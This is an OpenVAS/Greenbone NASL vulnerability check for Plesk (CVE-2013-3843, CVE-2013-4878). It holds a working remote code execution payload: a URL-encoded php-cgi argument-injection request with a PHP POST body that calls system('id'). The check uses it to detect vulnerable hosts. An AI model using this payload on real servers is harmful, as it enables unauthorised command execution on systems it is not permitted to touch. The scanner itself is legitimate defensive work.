# Copyright (C) 2013 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:parallels:parallels_plesk_panel";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803712");
  script_version("2021-07-28T09:20:09+0000");
  script_tag(name:"last_modification", value:"2021-07-28 09:20:09 +0000 (Wed, 28 Jul 2021)");
  script_tag(name:"creation_date", value:"2013-06-06 11:34:50 +0530 (Thu, 06 Jun 2013)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2013-3843", "CVE-2013-4878");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Plesk < 11.0.9 Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_plesk_http_detect.nasl");
  script_require_ports("Services/www", 8443);
  script_mandatory_keys("plesk/http/detected");

  script_tag(name:"summary", value:"Plesk is prone to PHP code execution and command execution
  vulnerabilities.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  PHP code or OS commands.");

  script_tag(name:"affected", value:"Plesk version 9.5.4, 9.3, 9.2, 9.0 and 8.6 are known to be
  affected.");

  script_tag(name:"insight", value:"The flaws are due to improper validation of HTTP POST requests.
  By sending a specially crafted direct request an attacker can execute PHP code or OS commands.");

  script_tag(name:"solution", value:"Update to version 11.0.9 or later.");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/25986/");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2013/Jun/25");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2013/Jun/21");
  script_xref(name:"URL", value:"http://permalink.gmane.org/gmane.comp.security.full-disclosure/89512");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/php/plesk-apache-zeroday-remote-exploit");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

## uri_escape arguments
url = dir + "/%70%68%70%70%61%74%68/%70%68%70?%2D%64+%61%6C%6C%6F%77%5F" +
            "%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%6" +
            "6%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%" +
            "6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69" +
            "%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D" +
            "%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2" +
            "D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3" +
            "D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E";

postdata = '<?php echo "Content-Type:text/html\r\n\r\n";echo "OK\n";system("id;"); ?>';

headers = make_array("Content-Type", "application/x-www-form-urlencoded");

req = http_post_put_req(port: port, url: url, data: postdata, add_headers: headers);
res = http_keepalive_send_recv(port:port, data:req);

if (res && egrep(pattern:"uid=[0-9]+.*gid=[0-9]+", string:res)) {
  info['HTTP Method'] = "POST";
  info['Affected URL'] = http_report_vuln_url(port: port, url: url, url_only: TRUE);
  info['HTTP "POST" body'] = postdata;
  info['HTTP "Content-Type" header'] = "application/x-www-form-urlencoded";

  report  = 'By doing the following HTTP request:\n\n';
  report += text_format_table(array: info) + '\n\n';
  report += 'it was possible to execute the "id" command on the target host.';
  report += '\n\nResult:\n\n' + res;
  expert_info = 'Request:\n\n' + req + '\n\nResponse:\n\n' + res;
  security_message(port:port, data:report);

  exit(0);
}

exit(99);